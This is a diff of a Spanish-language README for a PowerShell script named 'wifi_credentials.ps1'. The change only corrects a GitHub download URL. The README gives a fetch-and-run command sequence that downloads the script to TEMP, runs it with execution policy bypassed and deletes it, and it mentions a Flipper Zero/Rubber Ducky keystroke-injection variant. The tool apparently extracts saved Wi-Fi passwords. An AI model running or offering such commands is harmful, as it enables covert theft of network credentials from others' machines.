@@ -12,7 +12,7 @@ Para utilizar este script, sigue estos pasos:
 
 1. **Descargar y Ejecutar el Script Manualmente**: Puedes descargar el script `wifi_credentials.ps1` directamente desde GitHub y ejecutarlo manualmente en PowerShell.
    ```powershell
-   Invoke-WebRequest -Uri "https://raw.githubusercontent.com/alejandro001100/wifi_credentials/main/wifi_credentials.ps1" -OutFile "$env:TEMP\wifi_credentials.ps1"
+   Invoke-WebRequest -Uri "https://raw.githubusercontent.com/alejandro001100/wifi_credentials.ps1/main/wifi_credentials.ps1" -OutFile "$env:TEMP\wifi_credentials.ps1"
    powershell -ExecutionPolicy Bypass -File "$env:TEMP\wifi_credentials.ps1"
    Remove-Item "$env:TEMP\wifi_credentials.ps1"
 2.  **Usar con Flipper Zero:** Si deseas utilizar este script con un dispositivo USB Rubber Ducky (Flipper Zero), puedes utilizar el siguiente DuckyScript:
